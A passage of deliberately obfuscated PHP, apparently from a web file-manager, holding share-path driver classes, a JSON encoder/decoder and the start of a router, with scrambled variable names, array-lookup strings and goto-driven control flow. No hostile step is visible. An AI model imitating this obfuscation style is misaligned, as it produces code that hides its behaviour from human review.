$this->model->fileInfoGet($C®¿ÓŒªœ); IO::fileOutImage($B‘Ì½²[$Fª‰«œ¼±Ø[75]], $Bˆ„Ì÷ªøÓ); } public function fileOutImage($FºôˆÌêçæ, $A–‘´ñ¦ñÊ = 250) { $this->_fileOutImage($FºôˆÌêçæ, $A–‘´ñ¦ñÊ); } public function fileOutImageServer($C§®‹ÍøËš, $c–©±¿ù» = 250) { $this->_fileOutImage($C§®‹ÍøËš, $c–©±¿ù»); } public function link($b†ã ©‹›, $E¼ñ…ÒÜÏ“ = '') { $báğ’ë´¸ = $this->model->fileInfoGet($b†ã ©‹›); return IO::link($báğ’ë´¸[$_SERVER[õëù©û][75]], $E¼ñ…ÒÜÏ“); } protected function parse($C‹àÃ©¶„) { $a¤ÃÉîª´ =& $_SERVER[õëù©û]; if (strstr($C‹àÃ©¶„, $a¤ÃÉîª´[8]) === !1) { return array($a¤ÃÉîª´[381] => intval($C‹àÃ©¶„), $a¤ÃÉîª´[75] => $a¤ÃÉîª´[33], $a¤ÃÉîª´[1102] => array()); } $BÏßã³ê«¯ = explode($a¤ÃÉîª´[8], trim($C‹àÃ©¶„, $a¤ÃÉîª´[8])); if (count($BÏßã³ê«¯) < 2) { show_tips($C‹àÃ©¶„ . $a¤ÃÉîª´[1106]); } return array($a¤ÃÉîª´[381] => intval($BÏßã³ê«¯[0]), $a¤ÃÉîª´[75] => $BÏßã³ê«¯[1], $a¤ÃÉîª´[1102] => array_slice($BÏßã³ê«¯, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($F‚—ÊÉä¸) { $this->pathParse = $F‚—ÊÉä¸; $this->model = Model($_SERVER[õëù©û][1101]); } public function getPathOuter($aùŒŒÙ‹æë) { $FÂ©Æò·í =& $_SERVER[õëù©û]; if (!$aùŒŒÙ‹æë) { return $aùŒŒÙ‹æë; } $B±éâ‰öô = $this->parse($aùŒŒÙ‹æë); return trim(KodIO::makeShare($this->pathParse[$FÂ©Æò·í[363]], $B±éâ‰öô[$FÂ©Æò·í[363]]), $FÂ©Æò·í[8]); } protected function infoParse($E‹‡ëŠÉÑ¶, $aø–ÙìÚ = false, $bÛ¹ºÅ¶µ = false) { $B‚ÙŠâŠÀ =& $_SERVER[õëù©û]; $F§†Ğ×¿‡ = $this->pathParse[$B‚ÙŠâŠÀ[363]]; $cÙ‰† ­³ = trim($this->pathParse[$B‚ÙŠâŠÀ[1002]], $B‚ÙŠâŠÀ[8]); return Action($B‚ÙŠâŠÀ[1107])->sharePathInfo($F§†Ğ×¿‡, $cÙ‰† ­³); } public function infoFull($DøÉÎÒÍé) { $fô…Ä–¡ÁÜ =& $_SERVER[õëù©û]; $dìçœ¥²Ï = explode($fô…Ä–¡ÁÜ[8], trim($DøÉÎÒÍé, $fô…Ä–¡ÁÜ[8])); if (count($dìçœ¥²Ï) > 1) { $cÍÚ·æÜ¾Õ = implode($fô…Ä–¡ÁÜ[8], array_splice($dìçœ¥²Ï, 1)); $b××ªíÉè = $this->model->pathInfoByPath($dìçœ¥²Ï[0], $cÍÚ·æÜ¾Õ); if (!$b××ªíÉè) { return !1; } $this->pathParse[$fô…Ä–¡ÁÜ[1002]] = $b××ªíÉè[$fô…Ä–¡ÁÜ[365]]; } return $this->infoParse($DøÉÎÒÍé); } public function listAll($F›áİ¥Ö’ª) { goto B…¶µ‘ƒî•; Cçö›ÉÖ…È: foreach ($Eëƒ«°ãØ as &$B‹Ñâƒ¤æá) { check_abort(); $B‹Ñâƒ¤æá[$bˆ’À”Óª„[387]] = $c„—ªŸ¨„ó->_shareItemeParse($B‹Ñâƒ¤æá[$bˆ’À”Óª„[387]], $FÔ¼‹ŒÃÈ‰); } return $Eëƒ«°ãØ; goto A›·á½¢™; B…¶µ‘ƒî•: $bˆ’À”Óª„ =& $_SERVER[õëù©û]; $a™Ï†å²ò = IO::info($this->pathParse[$bˆ’À”Óª„[75]]); if (!$a™Ï†å²ò) { return array(); } goto bÎ¿ÖŞË¶×; bÎ¿ÖŞË¶×: $Eëƒ«°ãØ = $this->model->listAll($F›áİ¥Ö’ª); $FÔ¼‹ŒÃÈ‰ = Model($bˆ’À”Óª„[531])->getInfo($a™Ï†å²ò[$bˆ’À”Óª„[436]]); $c„—ªŸ¨„ó = Action($bˆ’À”Óª„[1107]); goto Cçö›ÉÖ…È; A›·á½¢™: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($c«ìùš®) { $this->pathParse = $c«ìùš®; $this->model = Model($_SERVER[õëù©û][1101]); } protected function infoParse($b…Ñ«»ïå¾, $b‚ßÂÙààó = false, $F›÷´ÙÃàø = false) { $EÙ¾¹Úäè˜ =& $_SERVER[õëù©û]; return Action($EÙ¾¹Úäè˜[1008])->sharePathInfo($this->pathParse[$EÙ¾¹Úäè˜[75]], !0); } public function listPath($e‚—ª”©Ä, $BÏİÄÌİˆÒ = false) { $eğŞ–¯¢Æ =& $_SERVER[õëù©û]; $c·Öñ¤ãø‚ = parent::listPath($e‚—ª”©Ä, $BÏİÄÌİˆÒ); foreach ($c·Öñ¤ãø‚ as $DÕµ¢†‘›Š => $c´š¼‘ÎÌÀ) { if (!in_array($DÕµ¢†‘›Š, array($eğŞ–¯¢Æ[73], $eğŞ–¯¢Æ[74]))) { continue; } foreach ($c´š¼‘ÎÌÀ as $f‘œéÓ‘‰ => $E¦ö‚¦ˆÚò) { $c·Öñ¤ãø‚[$DÕµ¢†‘›Š][$f‘œéÓ‘‰] = Action($eğŞ–¯¢Æ[1008])->shareItemInfo($E¦ö‚¦ˆÚò); } } return $c·Öñ¤ãø‚; } public function listAll($c¥ÂšÁâÖ) { $A£ÑàÙğªé =& $_SERVER[õëù©û]; $D®¯ª§Ö×Å = IO::info($this->pathParse[$A£ÑàÙğªé[75]]); if (!$D®¯ª§Ö×Å) { return array(); } $dšëÚ×¯ = $this->model->listAll($c¥ÂšÁâÖ); foreach ($dšëÚ×¯ as &$e’»ÄƒŠ‰Ø) { $e’»ÄƒŠ‰Ø[$A£ÑàÙğªé[387]] = Action($A£ÑàÙğªé[1008])->shareItemInfo($e’»ÄƒŠ‰Ø[$A£ÑàÙğªé[387]]); } return $dšëÚ×¯; } } goto F°˜·äã¶Ê; B¸²‡Øš²ñ: define($_SERVER[õëù©û][1901], 16); define($_SERVER[õëù©û][1902], 32); class Services_JSON { function __construct($eİ‹‡³Ã»† = 0) { $this->use = $eİ‹‡³Ã»†; } function utf162utf8($bŸ¤æòŸÄª) { $C…“ÔÀÓ“Ö =& $_SERVER[õëù©û]; if (function_exists($C…“ÔÀÓ“Ö[68])) { return mb_convert_encoding($bŸ¤æòŸÄª, $C…“ÔÀÓ“Ö[1554], $C…“ÔÀÓ“Ö[1903]); } $d‘Ì™ÚâÚ = ord($bŸ¤æòŸÄª[0]) << 8 | ord($bŸ¤æòŸÄª[1]); switch (!0) { case (127 & $d‘Ì™ÚâÚ) == $d‘Ì™ÚâÚ: return chr(127 & $d‘Ì™ÚâÚ); case (2047 & $d‘Ì™ÚâÚ) == $d‘Ì™ÚâÚ: return chr(192 | $d‘Ì™ÚâÚ >> 6 & 31) . chr(128 | $d‘Ì™ÚâÚ & 63); case (65535 & $d‘Ì™ÚâÚ) == $d‘Ì™ÚâÚ: return chr(224 | $d‘Ì™ÚâÚ >> 12 & 15) . chr(128 | $d‘Ì™ÚâÚ >> 6 & 63) . chr(128 | $d‘Ì™ÚâÚ & 63); } return $C…“ÔÀÓ“Ö[33]; } function utf82utf16($dš÷‰ƒ¸Ø) { $díØ—˜¨•§ =& $_SERVER[õëù©û]; if (function_exists($díØ—˜¨•§[68])) { return mb_convert_encoding($dš÷‰ƒ¸Ø, $díØ—˜¨•§[1903], $díØ—˜¨•§[1554]); } switch (strlen($dš÷‰ƒ¸Ø)) { case 1: return $dš÷‰ƒ¸Ø; case 2: return chr(7 & ord($dš÷‰ƒ¸Ø[0]) >> 2) . chr(192 & ord($dš÷‰ƒ¸Ø[0]) << 6 | 63 & ord($dš÷‰ƒ¸Ø[1])); case 3: return chr(240 & ord($dš÷‰ƒ¸Ø[0]) << 4 | 15 & ord($dš÷‰ƒ¸Ø[1]) >> 2) . chr(192 & ord($dš÷‰ƒ¸Ø[1]) << 6 | 127 & ord($dš÷‰ƒ¸Ø[2])); } return $díØ—˜¨•§[33]; } function encode($C˜÷›ôÓ§ï) { $C¸‘×„¡£™ =& $_SERVER[õëù©û]; switch (gettype($C˜÷›ôÓ§ï)) { case $C¸‘×„¡£™[1565]: return $C˜÷›ôÓ§ï ? $C¸‘×„¡£™[1564] : $C¸‘×„¡£™[1566]; case $C¸‘×„¡£™[1904]: return $C¸‘×„¡£™[99]; case $C¸‘×„¡£™[299]: return (int) $C˜÷›ôÓ§ï; case $C¸‘×„¡£™[274]: case $C¸‘×„¡£™[273]: return (double) $C˜÷›ôÓ§ï; case $C¸‘×„¡£™[308]: $F§¦¡óÛŠ = $C¸‘×„¡£™[33]; $B ò¯â®– = strlen($C˜÷›ôÓ§ï); for ($c™íë‰¯±É = 0; $c™íë‰¯±É < $B ò¯â®–; ++$c™íë‰¯±É) { $dŸ¾ ºŸ = ord($C˜÷›ôÓ§ï[$c™íë‰¯±É]); switch (!0) { case $dŸ¾ ºŸ == 8: $F§¦¡óÛŠ .= $C¸‘×„¡£™[1905]; break; case $dŸ¾ ºŸ == 9: $F§¦¡óÛŠ .= $C¸‘×„¡£™[1541]; break; case $dŸ¾ ºŸ == 10: $F§¦¡óÛŠ .= $C¸‘×„¡£™[1539]; break; case $dŸ¾ ºŸ == 12: $F§¦¡óÛŠ .= $C¸‘×„¡£™[1906]; break; case $dŸ¾ ºŸ == 13: $F§¦¡óÛŠ .= $C¸‘×„¡£™[1540]; break; case $dŸ¾ ºŸ == 34: case $dŸ¾ ºŸ == 47: case $dŸ¾ ºŸ == 92: $F§¦¡óÛŠ .= $C¸‘×„¡£™[93] . $C˜÷›ôÓ§ï[$c™íë‰¯±É]; break; case $dŸ¾ ºŸ >= 32 && $dŸ¾ ºŸ <= 127: $F§¦¡óÛŠ .= $C˜÷›ôÓ§ï[$c™íë‰¯±É]; break; case ($dŸ¾ ºŸ & 224) == 192: $f±ñ‘¯¾çÇ = pack($C¸‘×„¡£™[1907], $dŸ¾ ºŸ, ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 1])); $c™íë‰¯±É += 1; $D„Ì‰ƒä±Ú = $this->utf82utf16($f±ñ‘¯¾çÇ); $F§¦¡óÛŠ .= sprintf($C¸‘×„¡£™[1908], bin2hex($D„Ì‰ƒä±Ú)); break; case ($dŸ¾ ºŸ & 240) == 224: $f±ñ‘¯¾çÇ = pack($C¸‘×„¡£™[1907], $dŸ¾ ºŸ, ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 1]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 2])); $c™íë‰¯±É += 2; $D„Ì‰ƒä±Ú = $this->utf82utf16($f±ñ‘¯¾çÇ); $F§¦¡óÛŠ .= sprintf($C¸‘×„¡£™[1908], bin2hex($D„Ì‰ƒä±Ú)); break; case ($dŸ¾ ºŸ & 248) == 240: $f±ñ‘¯¾çÇ = pack($C¸‘×„¡£™[1907], $dŸ¾ ºŸ, ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 1]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 2]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 3])); $c™íë‰¯±É += 3; $D„Ì‰ƒä±Ú = $this->utf82utf16($f±ñ‘¯¾çÇ); $F§¦¡óÛŠ .= sprintf($C¸‘×„¡£™[1908], bin2hex($D„Ì‰ƒä±Ú)); break; case ($dŸ¾ ºŸ & 252) == 248: $f±ñ‘¯¾çÇ = pack($C¸‘×„¡£™[1907], $dŸ¾ ºŸ, ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 1]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 2]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 3]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 4])); $c™íë‰¯±É += 4; $D„Ì‰ƒä±Ú = $this->utf82utf16($f±ñ‘¯¾çÇ); $F§¦¡óÛŠ .= sprintf($C¸‘×„¡£™[1908], bin2hex($D„Ì‰ƒä±Ú)); break; case ($dŸ¾ ºŸ & 254) == 252: $f±ñ‘¯¾çÇ = pack($C¸‘×„¡£™[1907], $dŸ¾ ºŸ, ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 1]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 2]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 3]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 4]), ord($C˜÷›ôÓ§ï[$c™íë‰¯±É + 5])); $c™íë‰¯±É += 5; $D„Ì‰ƒä±Ú = $this->utf82utf16($f±ñ‘¯¾çÇ); $F§¦¡óÛŠ .= sprintf($C¸‘×„¡£™[1908], bin2hex($D„Ì‰ƒä±Ú)); break; } } return $C¸‘×„¡£™[112] . $F§¦¡óÛŠ . $C¸‘×„¡£™[112]; case $C¸‘×„¡£™[1909]: if (is_array($C˜÷›ôÓ§ï) && count($C˜÷›ôÓ§ï) && array_keys($C˜÷›ôÓ§ï) !== range(0, sizeof($C˜÷›ôÓ§ï) - 1)) { $a¯•ÈùÄâ¡ = array_map(array($this, $C¸‘×„¡£™[1910]), array_keys($C˜÷›ôÓ§ï), array_values($C˜÷›ôÓ§ï)); foreach ($a¯•ÈùÄâ¡ as $D´ÙÍÅ÷®) { if (Services_JSON::isError($D´ÙÍÅ÷®)) { return $D´ÙÍÅ÷®; } } return $C¸‘×„¡£™[1059] . join($C¸‘×„¡£™[47], $a¯•ÈùÄâ¡) . $C¸‘×„¡£™[311]; } $bŠÑóçæéÔ = array_map(array($this, $C¸‘×„¡£™[1911]), $C˜÷›ôÓ§ï); foreach ($bŠÑóçæéÔ as $dÕÒ‡¸©á²) { if (Services_JSON::isError($dÕÒ‡¸©á²)) { return $dÕÒ‡¸©á²; } } return $C¸‘×„¡£™[153] . join($C¸‘×„¡£™[47], $bŠÑóçæéÔ) . $C¸‘×„¡£™[471]; case $C¸‘×„¡£™[1912]: $F®º”éÎøÙ = get_object_vars($C˜÷›ôÓ§ï); $a¯•ÈùÄâ¡ = array_map(array($this, $C¸‘×„¡£™[1910]), array_keys($F®º”éÎøÙ), array_values($F®º”éÎøÙ)); foreach ($a¯•ÈùÄâ¡ as $D´ÙÍÅ÷®) { if (Services_JSON::isError($D´ÙÍÅ÷®)) { return $D´ÙÍÅ÷®; } } return $C¸‘×„¡£™[1059] . join($C¸‘×„¡£™[47], $a¯•ÈùÄâ¡) . $C¸‘×„¡£™[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $C¸‘×„¡£™[99] : new Services_JSON_Error(gettype($C˜÷›ôÓ§ï) . $C¸‘×„¡£™[1913]); } } function name_value($Bğœó‘’¯¾, $E…ÑŞò˜“Œ) { $CÆİ¿İ÷¾» = $this->encode($E…ÑŞò˜“Œ); if (Services_JSON::isError($CÆİ¿İ÷¾»)) { return $CÆİ¿İ÷¾»; } return $this->encode(strval($Bğœó‘’¯¾)) . $_SERVER[õëù©û][4] . $CÆİ¿İ÷¾»; } function reduce_string($b­òá»‘µØ) { $aš´÷»Ã¾‘ =& $_SERVER[õëù©û]; $b­òá»‘µØ = preg_replace(array($aš´÷»Ã¾‘[1914], $aš´÷»Ã¾‘[1915], $aš´÷»Ã¾‘[1916]), $aš´÷»Ã¾‘[33], $b­òá»‘µØ); return trim($b­òá»‘µØ); } function decode($cŞã«ç»ğ) { $a‚ÏğÉ»ºä =& $_SERVER[õëù©û]; $cŞã«ç»ğ = $this->reduce_string($cŞã«ç»ğ); switch (strtolower($cŞã«ç»ğ)) { case $a‚ÏğÉ»ºä[1564]: return !0; case $a‚ÏğÉ»ºä[1566]: return !1; case $a‚ÏğÉ»ºä[99]: return null; default: $eèÕçÜÙ = array(); if (is_numeric($cŞã«ç»ğ)) { return (double) $cŞã«ç»ğ == (int) $cŞã«ç»ğ ? (int) $cŞã«ç»ğ : (double) $cŞã«ç»ğ; } elseif (preg_match($a‚ÏğÉ»ºä[1917], $cŞã«ç»ğ, $eèÕçÜÙ) && $eèÕçÜÙ[1] == $eèÕçÜÙ[2]) { $AƒÇèŞÎ—™ = substr($cŞã«ç»ğ, 0, 1); $C½ƒœ¼®ƒ„ = substr($cŞã«ç»ğ, 1, -1); $BßØ§³„¶ƒ = $a‚ÏğÉ»ºä[33]; $fËÒ¾„¯È… = strlen($C½ƒœ¼®ƒ„); for ($EÀõá­ºÀÙ = 0; $EÀõá­ºÀÙ < $fËÒ¾„¯È…; ++$EÀõá­ºÀÙ) { $b¯£ÌŸßŒ’ = substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 2); $DÕ¿«“ã‰Ô = ord($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ]); switch (!0) { case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1905]: $BßØ§³„¶ƒ .= chr(8); ++$EÀõá­ºÀÙ; break; case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1541]: $BßØ§³„¶ƒ .= chr(9); ++$EÀõá­ºÀÙ; break; case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1539]: $BßØ§³„¶ƒ .= chr(10); ++$EÀõá­ºÀÙ; break; case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1906]: $BßØ§³„¶ƒ .= chr(12); ++$EÀõá­ºÀÙ; break; case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1540]: $BßØ§³„¶ƒ .= chr(13); ++$EÀõá­ºÀÙ; break; case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1322]: case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1918]: case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1534]: case $b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1536]: if ($AƒÇèŞÎ—™ == $a‚ÏğÉ»ºä[112] && $b¯£ÌŸßŒ’ != $a‚ÏğÉ»ºä[1918] || $AƒÇèŞÎ—™ == $a‚ÏğÉ»ºä[55] && $b¯£ÌŸßŒ’ != $a‚ÏğÉ»ºä[1322]) { $BßØ§³„¶ƒ .= $C½ƒœ¼®ƒ„[++$EÀõá­ºÀÙ]; } break; case preg_match($a‚ÏğÉ»ºä[1919], substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 6)): $FöÂÇ‹àœÔ = chr(hexdec(substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ + 2, 2))) . chr(hexdec(substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ + 4, 2))); $BßØ§³„¶ƒ .= $this->utf162utf8($FöÂÇ‹àœÔ); $EÀõá­ºÀÙ += 5; break; case $DÕ¿«“ã‰Ô >= 32 && $DÕ¿«“ã‰Ô <= 127: $BßØ§³„¶ƒ .= $C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ]; break; case ($DÕ¿«“ã‰Ô & 224) == 192: $BßØ§³„¶ƒ .= substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 2); ++$EÀõá­ºÀÙ; break; case ($DÕ¿«“ã‰Ô & 240) == 224: $BßØ§³„¶ƒ .= substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 3); $EÀõá­ºÀÙ += 2; break; case ($DÕ¿«“ã‰Ô & 248) == 240: $BßØ§³„¶ƒ .= substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 4); $EÀõá­ºÀÙ += 3; break; case ($DÕ¿«“ã‰Ô & 252) == 248: $BßØ§³„¶ƒ .= substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 5); $EÀõá­ºÀÙ += 4; break; case ($DÕ¿«“ã‰Ô & 254) == 252: $BßØ§³„¶ƒ .= substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 6); $EÀõá­ºÀÙ += 5; break; } } return $BßØ§³„¶ƒ; } elseif (preg_match($a‚ÏğÉ»ºä[1920], $cŞã«ç»ğ) || preg_match($a‚ÏğÉ»ºä[1921], $cŞã«ç»ğ)) { goto Eº•¯ œğ¦; A‚™Ôãªó: $C½ƒœ¼®ƒ„ = $this->reduce_string($C½ƒœ¼®ƒ„); if ($C½ƒœ¼®ƒ„ == $a‚ÏğÉ»ºä[33]) { if (reset($côÌ±íÑ) == SERVICES_JSON_IN_ARR) { return $Aç’‚áæ¤á; } else { return $eŒº„‡¦ëİ; } } $fËÒ¾„¯È… = strlen($C½ƒœ¼®ƒ„); goto A…Ë„‹ÜÇ¸; Eº•¯ œğ¦: if ($cŞã«ç»ğ[0] == $a‚ÏğÉ»ºä[153]) { $côÌ±íÑ = array(SERVICES_JSON_IN_ARR); $Aç’‚áæ¤á = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $côÌ±íÑ = array(SERVICES_JSON_IN_OBJ); $eŒº„‡¦ëİ = array(); } else { $côÌ±íÑ = array(SERVICES_JSON_IN_OBJ); $eŒº„‡¦ëİ = new stdClass(); } } array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_SLICE, $a‚ÏğÉ»ºä[259] => 0, $a‚ÏğÉ»ºä[1923] => !1)); $C½ƒœ¼®ƒ„ = substr($cŞã«ç»ğ, 1, -1); goto A‚™Ôãªó; A…Ë„‹ÜÇ¸: for ($EÀõá­ºÀÙ = 0; $EÀõá­ºÀÙ <= $fËÒ¾„¯È…; ++$EÀõá­ºÀÙ) { $eî¨”œºŠÖ = end($côÌ±íÑ); $b¯£ÌŸßŒ’ = substr($C½ƒœ¼®ƒ„, $EÀõá­ºÀÙ, 2); if ($EÀõá­ºÀÙ == $fËÒ¾„¯È… || $C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[47] && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] == SERVICES_JSON_SLICE) { $a¨ìå¨œ…ª = substr($C½ƒœ¼®ƒ„, $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[259]], $EÀõá­ºÀÙ - $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[259]]); array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_SLICE, $a‚ÏğÉ»ºä[259] => $EÀõá­ºÀÙ + 1, $a‚ÏğÉ»ºä[1923] => !1)); if (reset($côÌ±íÑ) == SERVICES_JSON_IN_ARR) { array_push($Aç’‚áæ¤á, $this->decode($a¨ìå¨œ…ª)); } elseif (reset($côÌ±íÑ) == SERVICES_JSON_IN_OBJ) { $AªÖÕíÑ = array(); if (preg_match($a‚ÏğÉ»ºä[1924], $a¨ìå¨œ…ª, $AªÖÕíÑ)) { $CÃ«‚óßõ = $this->decode($AªÖÕíÑ[1]); $fÏ‹ĞÎÍ = $this->decode($AªÖÕíÑ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eŒº„‡¦ëİ[$CÃ«‚óßõ] = $fÏ‹ĞÎÍ; } else { $eŒº„‡¦ëİ->{$CÃ«‚óßõ} = $fÏ‹ĞÎÍ; } } elseif (preg_match($a‚ÏğÉ»ºä[1925], $a¨ìå¨œ…ª, $AªÖÕíÑ)) { $CÃ«‚óßõ = $AªÖÕíÑ[1]; $fÏ‹ĞÎÍ = $this->decode($AªÖÕíÑ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eŒº„‡¦ëİ[$CÃ«‚óßõ] = $fÏ‹ĞÎÍ; } else { $eŒº„‡¦ëİ->{$CÃ«‚óßõ} = $fÏ‹ĞÎÍ; } } } } elseif (($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[112] || $C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[55]) && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] != SERVICES_JSON_IN_STR) { array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_IN_STR, $a‚ÏğÉ»ºä[259] => $EÀõá­ºÀÙ, $a‚ÏğÉ»ºä[1923] => $C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ])); } elseif ($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1923]] && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] == SERVICES_JSON_IN_STR && (strlen(substr($C½ƒœ¼®ƒ„, 0, $EÀõá­ºÀÙ)) - strlen(rtrim(substr($C½ƒœ¼®ƒ„, 0, $EÀõá­ºÀÙ), $a‚ÏğÉ»ºä[93]))) % 2 != 1) { array_pop($côÌ±íÑ); } elseif ($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[153] && in_array($eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_IN_ARR, $a‚ÏğÉ»ºä[259] => $EÀõá­ºÀÙ, $a‚ÏğÉ»ºä[1923] => !1)); } elseif ($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[471] && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] == SERVICES_JSON_IN_ARR) { array_pop($côÌ±íÑ); } elseif ($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[1059] && in_array($eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_IN_OBJ, $a‚ÏğÉ»ºä[259] => $EÀõá­ºÀÙ, $a‚ÏğÉ»ºä[1923] => !1)); } elseif ($C½ƒœ¼®ƒ„[$EÀõá­ºÀÙ] == $a‚ÏğÉ»ºä[311] && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] == SERVICES_JSON_IN_OBJ) { array_pop($côÌ±íÑ); } elseif ($b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1926] && in_array($eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($côÌ±íÑ, array($a‚ÏğÉ»ºä[1922] => SERVICES_JSON_IN_CMT, $a‚ÏğÉ»ºä[259] => $EÀõá­ºÀÙ, $a‚ÏğÉ»ºä[1923] => !1)); $EÀõá­ºÀÙ++; } elseif ($b¯£ÌŸßŒ’ == $a‚ÏğÉ»ºä[1927] && $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[1922]] == SERVICES_JSON_IN_CMT) { array_pop($côÌ±íÑ); $EÀõá­ºÀÙ++; for ($eñÁ¨õƒ–ê = $eî¨”œºŠÖ[$a‚ÏğÉ»ºä[259]]; $eñÁ¨õƒ–ê <= $EÀõá­ºÀÙ; ++$eñÁ¨õƒ–ê) { $C½ƒœ¼®ƒ„ = substr_replace($C½ƒœ¼®ƒ„, $a‚ÏğÉ»ºä[50], $eñÁ¨õƒ–ê, 1); } } } if (reset($côÌ±íÑ) == SERVICES_JSON_IN_ARR) { return $Aç’‚áæ¤á; } elseif (reset($côÌ±íÑ) == SERVICES_JSON_IN_OBJ) { return $eŒº„‡¦ëİ; } goto bŠ³«›±àè; bŠ³«›±àè: } } } function isError($c²éá®˜õó, $f¾â›†ï‚ = null) { $b±–ï¦íĞ° =& $_SERVER[õëù©û]; if (class_exists($b±–ï¦íĞ°[1928])) { return PEAR::isError($c²éá®˜õó, $f¾â›†ï‚); } elseif (is_object($c²éá®˜õó) && (get_class($c²éá®˜õó) == $b±–ï¦íĞ°[1929] || is_subclass_of($c²éá®˜õó, $b±–ï¦íĞ°[1929]))) { return !0; } return !1; } } goto f¾‚àİêê; A«ƒèï: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\x2f\135\x2b", "\72\x6e\165\155" => "\x5b\x30\x2d\x39\135\53", "\72\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($b™šã¯‘…, $b¨’ÃÑˆˆì) { $dô¼Ïó˜¾ =& $_SERVER[õëù©û]; if ($b™šã¯‘… == $dô¼Ïó˜¾[1353]) { $eŒó—‡â¨Œ = array_map($dô¼Ïó˜¾[1354], $b¨’ÃÑˆˆì[0]); $A’«Üˆ„Ñ… = strpos($b¨’ÃÑˆˆì[1], $dô¼Ïó˜¾[8]) === 0 ? $b¨’ÃÑˆˆì[1] : $dô¼Ïó˜¾[8] . $b¨’ÃÑˆˆì[1]; $Bœ‰×³§º = $b¨’ÃÑˆˆì[2]; } else { $eŒó—‡â¨Œ = null; $A’«Üˆ„Ñ… = strpos($b¨’ÃÑˆˆì[0], $dô¼Ïó˜¾[8]) === 0 ? $b¨’ÃÑˆˆì[0] : $dô¼Ïó˜¾[8] . $b¨’ÃÑˆˆì[0]; $Bœ‰×³§º = $b¨’ÃÑˆˆì[1]; } array_push(self::$maps, $eŒó—‡â¨Œ); array_push(self::$routes, $A’«Üˆ„Ñ…); array_push(self::$methods, strtoupper($b™šã¯‘…)); array_push(self::$callbacks, $Bœ‰×³§º); } public static function 